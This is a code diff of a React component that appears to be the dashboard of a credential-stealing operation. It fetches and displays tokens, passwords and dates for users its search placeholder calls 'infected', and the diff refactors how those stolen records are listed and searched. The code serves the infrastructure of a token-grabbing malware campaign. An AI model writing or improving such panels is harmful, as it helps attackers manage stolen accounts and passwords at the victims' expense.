@@ -1,16 +1,16 @@
 import { useState, useEffect } from 'react';
 import axios from 'axios';
-import dayjs from 'dayjs';
-import config from '../config';
+import config from './config';
+import GotTokens from './tokens/GotTokens';
 
-const Tokens = () => {
+const Tokens = ({user}) => {
 	const { DOMAIN } = config;
 	const url = `${DOMAIN}/api/alpha-int-os-python-testing3`;
 	const [tokens, setTokens] = useState([]);
 	const [gotTokens, setGotTokens] = useState([]);
 	const [search, setSearch] = useState("");
 	const [error, setError] = useState([]);
-	const { DOMAIN } = config;
+	const [username, setUsername] = useState(null);
 
 	useEffect(() => {
 		const fetchTokens = async () => {
@@ -23,15 +23,19 @@ const Tokens = () => {
 				setTokens(res.data.data);
 				setGotTokens(res.data.data);
 			} catch(e) {
-				setError(e.response.data.response);
-				
+				setError(e.response ? e.response.data.message : "Ocurrió un error inesperado");
 			}
 		}
 		fetchTokens();
-	}, []);
+	}, [url]);
 
-	const searchQuery = () => {
-		
+	useEffect(() => {
+		if (user !== null) {
+			setUsername(user.username);
+		}
+	}, [user]);
+
+	useEffect(() => {
 		const query = search.toLowerCase();
 		let d = [];
 		gotTokens.forEach(t => {
@@ -40,12 +44,11 @@ const Tokens = () => {
 				d.push(t);
 			} 
 		});
-		setTokens(d);
-	}
+		setTokens(d);		
+	}, [search]);
 
 	const changeQuery = e => {
 		setSearch(e.target.value);
-		searchQuery();
 	}
 	return (
 		<div className="container-tokens">
@@ -58,24 +61,12 @@ const Tokens = () => {
 				placeholder="Ingresa el nick de un usuario infectado..."
 				onChange={changeQuery} 
 			/>
+			<h2>{error}</h2>
+			{username ? <h2>Welcome back <span>{username}</span>!</h2> : ""}
 			<div className="tokens-box">
-				<h2>{error}</h2>
 				{
-					tokens.map(({token, password, username, userId, date, _id}) => (
-						<div className="token-card" key={_id}>
-							<div className="token-card-header">
-								<h2>{username}</h2>
-								<span>{dayjs(date).format("DD/MM/YYYY")}</span>
-							</div>
-							<div className="token-card-body">
-								<p>
-									{token}
-								</p>
-								<p>
-									$psw: {password ? password : "Null"}
-								</p>
-							</div>
-						</div>
+					tokens.map(({token, date, password, _id}) => (
+						<GotTokens token={token} date={date} password={password} key={_id}/>
 					))
 				}
 			</div>
